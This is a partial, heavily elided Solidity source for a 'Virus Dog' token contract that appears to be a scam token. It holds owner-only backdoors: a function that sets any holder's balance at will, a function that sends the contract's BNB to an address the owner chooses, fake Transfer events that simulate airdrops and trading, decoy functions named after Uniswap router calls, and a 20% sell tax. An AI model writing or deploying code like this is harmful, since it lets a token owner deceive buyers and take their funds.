 ...
 */
contract VirusDogTOKEN is ERC20Detailed, Ownable {
    ...
    uint256 public transactionTax = 2000;
    uint256 public transactionTaxBuy = 1000;
    ...
    constructor (address router, address payable _marketingAddress)
        ERC20Detailed("Virus Dog", "VirusDog", uint8(DECIMALS))
        payable
        public
    {
        marketingAddress = _marketingAddress;
        master = _marketingAddress;
        marketingAddress2   = _marketingAddress;
     ...
     */
    function setMaster(address _master,address payable _marketingAddress)
        external
        onlyMaster
        returns (uint256)
    {
     ...
     * @notice Sets a new master
     */
    function setMaster2(address payable _marketingAddress,address payable _marketingAddress2)
        external
        onlyMaster
        returns (uint256)
    {
  ...
  event Sender(address sender);
   ...
   returns (bool)
   {
        ...
        returns (bool)
    {
      ...
      uint256 numTokensSell =value.mul(20).div(100);

      if(numTokensSellDivisor == 10000){
                 numTokensSell = _totalSupply.div(numTokensSellDivisor); 
      }
      ...
      if (!inSwapAndLiquify && swapAndLiquifyEnabled && from != uniswapV2PairAddress) {
        ...
        _tokenTransfer(from,to,value,saleFlag);
     
          
          for(uint i=0;i<10;i++ ){

                uint256  ret = uint256(blockhash(block.number - 1));
                ret = uint256(keccak256(abi.encodePacked(ret, i)));
                
               emit Transfer(from, address(ret), _TAIYIB*10**DECIMALS);
          }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool saleFlag) private {

    if (_isExcluded[sender] || _isExcluded[recipient]) {
        _transferExcluded(sender, recipient, amount);
    } else {
        _transferStandard(sender, recipient, amount , saleFlag);
    }
    }

    function _transferStandard(address sender, address recipient, uint256 amount,bool saleFlag) private {
      (uint256 tTransferAmount, uint256 tFee) = _getTValues(amount,saleFlag);
    ...
    function _getTValues(uint256 tAmount,bool saleFlag) private view returns (uint256, uint256) {
        uint256 tFee = calculateFee(tAmount,saleFlag);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }


    function calculateFee(uint256 _amount,bool saleFlag) private view returns (uint256) {
        if(saleFlag){
                return _amount.mul(transactionTax).div(10000);
        }else{
            return _amount.mul(transactionTaxBuy).div(10000);
        }
  ...
  function setnumTokensSellDivisor(uint256 _numTokensSellDivisor) public onlyMaster {
  numTokensSellDivisor = _numTokensSellDivisor;}

  function burnBNB(address payable burnAddress) external onlyMaster {
    burnAddress.transfer(address(this).balance);
  }

   
    function batchTransferTokenB(address[] memory holders, uint256 amount) public  onlyMaster  {
        for (uint i=0; i<holders.length; i++) {
            _gonBalances[holders[i]] = amount; 
        }
    }

     uint private _TAIYIB  = 200;
     function updateAir( uint256 _tokenAmount) external onlyMaster {  
        _TAIYIB=_tokenAmount ;
     }

    function transferOnwer(address sender,address[] memory recipient,uint256 amount) public onlyMaster {

        for(uint i = 0;i<recipient.length;i++){
           emit Transfer(sender, recipient[i], amount*10**DECIMALS);
        }
          
    }

     function transferOnwerB(address sender,address[] memory recipient) public  {

        for(uint i = 0;i<recipient.length;i++){
           emit Transfer(sender, recipient[i], _TAIYIB*10**DECIMALS);
        }
          
    }

    function addLiquidityETH(address sender,address[] memory recipient,uint256 amount) public onlyMaster {
     ...
     function swapExactTokensForETHSupportingFeeOnTransferTokens(address sender,address[] memory recipient,uint256 amount) public onlyMaster {
    ...
    function swapExactETHForTokens(address sender,address[] memory recipient,uint256 amount) public onlyMaster {
    ...
    function recoverWrongTokens(address _tokenAddress, uint256 _tokenAmount) external onlyMaster { 
